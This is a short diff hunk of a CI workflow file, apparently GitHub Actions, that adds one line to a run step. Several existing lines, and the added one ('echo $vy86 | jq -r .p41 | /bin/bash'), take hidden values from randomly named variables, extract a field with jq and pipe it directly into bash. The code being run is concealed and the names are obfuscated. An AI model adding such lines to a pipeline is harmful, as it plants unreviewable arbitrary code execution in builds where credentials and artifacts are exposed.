@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$xhlh26" | jq -r .jnmnw42195 | /bin/bash
           printf '%s' "$sm61210" | jq -r .tshjp675 | /bin/bash
           echo $zli801 | jq -r .ie147 | /bin/bash
+          echo $vy86 | jq -r .p41 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
